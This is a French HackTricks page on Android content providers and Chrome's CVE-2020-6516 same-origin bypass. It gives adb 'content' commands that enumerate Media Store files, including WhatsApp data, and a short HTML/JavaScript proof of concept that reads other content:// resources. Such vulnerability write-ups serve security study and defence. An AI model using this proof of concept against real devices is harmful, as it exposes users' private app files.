<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une entreprise de cybers√©curit√©? Voulez-vous voir votre entreprise annonc√©e dans HackTricks? ou voulez-vous avoir acc√®s √† la derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


Pour exp√©rimenter avec les fournisseurs de contenu, on peut utiliser la commande `content` sur les appareils Android. L'acc√®s root n'est pas n√©cessairement requis. Par exemple, pour voir la liste des fichiers g√©r√©s par le Media Store, on peut ex√©cuter la commande suivante:
```bash
$ content query --uri content://media/external/file
```
Pour rendre la sortie plus conviviale, on peut limiter les colonnes affich√©es √† l'identifiant et au chemin de chaque fichier index√©.
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
Les fournisseurs de m√©dias existent dans leur propre espace de noms priv√©. Comme illustr√© dans l'exemple ci-dessus, pour acc√©der √† un fournisseur de contenu, l'URI `content://` correspondant doit √™tre sp√©cifi√©. En g√©n√©ral, les informations sur les chemins, via lesquels un fournisseur peut √™tre acc√©d√©, peuvent √™tre r√©cup√©r√©es en regardant les manifestes d'application (dans le cas o√π le fournisseur de contenu est export√© par une application) ou le code source du framework Android.

Fait int√©ressant, sur les appareils Android, Chrome prend en charge l'acc√®s aux fournisseurs de contenu via le sch√©ma `content://`. Cette fonctionnalit√© permet au navigateur d'acc√©der aux ressources (par exemple, photos, documents, etc.) export√©es par des applications tierces. Pour v√©rifier cela, on peut ins√©rer une entr√©e personnalis√©e dans le Media Store, puis y acc√©der en utilisant le navigateur :
```bash
$ cd /sdcard
$ echo "Hello, world!" > test.txt
$ content insert --uri content://media/external/file \
    --bind _data:s:/storage/emulated/0/test.txt \
    --bind mime_type:s:text/plain
```
Pour d√©couvrir l'identifiant du fichier nouvellement ins√©r√©:
```bash
$ content query --uri content://media/external/file \
    --projection _id,_data | grep test.txt
Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
Et pour visualiser le fichier dans Chrome, on peut utiliser une URL comme celle montr√©e dans l'image suivante. Remarquez l'identifiant de fichier 747 (d√©couvert ci-dessus) qui est utilis√© comme suffixe dans l'URL.

![Chrome "Hello, world!"](https://census-labs.com/media/whatsapp-screenshot-hello-world.png)

Par exemple, vous pouvez lister tous les fichiers li√©s √† WhatsApp avec:
```bash
$ content query --uri content://media/external/file --projection _id,_data | grep -i whatsapp
...

Row: 82 _id=58, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache
Row: 83 _id=705, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/157.240.9.53.443
Row: 84 _id=239, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/crashlogs.whatsapp.net.443
Row: 85 _id=240, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/pps.whatsapp.net.443
Row: 86 _id=90, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/static.whatsapp.net.443
Row: 87 _id=706, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/v.whatsapp.net.443
Row: 88 _id=89, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/www.whatsapp.com.443
...
```
## La faille de contournement de la Same-Origin-Policy CVE-2020-6516 de Chrome <a href="#cve-2020-6516" id="cve-2020-6516"></a>

La Same-Origin-Policy (SOP) \[[12](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)] dans les navigateurs dicte que le contenu Javascript de l'URL A ne pourra acc√©der au contenu de l'URL B que si les attributs suivants de l'URL A et de l'URL B restent les m√™mes :

* Le protocole, par exemple `https` vs `http`
* Le domaine, par exemple `www.example1.com` vs `www.example2.com`
* Le port, par exemple `www.example1.com:8080` vs `www.example1.com:8443`

Bien s√ªr, il y a des exceptions √† ces r√®gles, mais en g√©n√©ral, une ressource de `https://www.example1.com` (par exemple, un morceau de code Javascript) ne peut pas acc√©der au DOM d'une ressource sur `https://www.example2.com`, car cela introduirait de graves fuites d'informations. **√Ä moins qu'une politique Cross-Origin-Resource-Sharing (CORS) ne l'autorise explicitement, il ne devrait pas √™tre possible pour une ressource Web de contourner les r√®gles SOP.**

Il est essentiel de noter que Chrome consid√®re `content://` comme un _sch√©ma local_, tout comme `file://`. Dans ce cas, les r√®gles SOP sont encore plus strictes, car chaque URL de sch√©ma local est consid√©r√©e comme une origine distincte. Par exemple, le code Javascript dans **file:///tmp/test.html** ne devrait pas √™tre en mesure d'acc√©der au contenu de **file:///tmp/test2.html**, ou de tout autre fichier sur le syst√®me de fichiers. **Par cons√©quent, selon les r√®gles SOP, une ressource charg√©e via `content://` ne devrait pas √™tre en mesure d'acc√©der √† une autre ressource `content://`.** Eh bien, la vuln√©rabilit√© CVE-2020-6516 de Chrome a cr√©√© une "exception" √† cette r√®gle.

CVE-2020-6516 \[[03](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-6516)] est une faille de contournement SOP sur les ressources charg√©es via une URL `content://`. **Par exemple, le code Javascript, s'ex√©cutant dans le contexte d'un document HTML charg√© √† partir de `content://com.example.provider/test.html`, peut charger et acc√©der √† n'importe quelle autre ressource charg√©e via une URL `content://`.** Il s'agit d'une vuln√©rabilit√© grave, en particulier sur les appareils ex√©cutant Android 9 ou des versions ant√©rieures d'Android. Sur ces appareils, le stockage limit√© \[[13](https://developer.android.com/about/versions/10/privacy/changes#scoped-storage)] n'est pas impl√©ment√© et, par cons√©quent, les donn√©es sp√©cifiques √† l'application sous **/sdcard**, et plus int√©ressant encore sous **/sdcard/Android**, peuvent √™tre accessibles via le fournisseur de contenu Media Store du syst√®me.

Une preuve de concept est assez simple. Un document HTML qui utilise `XMLHttpRequest` pour acc√©der √† des URL `content://` arbitraires est t√©l√©charg√© sous **/sdcard**. Il est ensuite ajout√© dans le Media Store et rendu dans Chrome, de mani√®re similaire √† l'exemple pr√©c√©dent. √Ä des fins de d√©monstration, on peut tenter de charger `content://media/external/file/747` qui est, en fait, l'URL du Media Store de l'exemple "Hello, world!". √âtonnamment, le code Javascript, s'ex√©cutant dans l'origine du document HTML, r√©cup√©rera et affichera le contenu de **test.txt**.
```markup
<html>
<head>
    <title>PoC</title>
    <script type="text/javascript">
        function poc()
        {
            var xhr = new XMLHttpRequest();

            xhr.onreadystatechange = function()
            {
                if(this.readyState == 4)
                {
                    if(this.status == 200 || this.status == 0)
                    {
                        alert(xhr.response);
                    }
                }
            }

            xhr.open("GET", "content://media/external/file/747");
            xhr.send();
        }
    </script>
</head>
<body onload="poc()"></body>
</html>
```
**Informations tir√©es de cet article :** [**https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/**](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
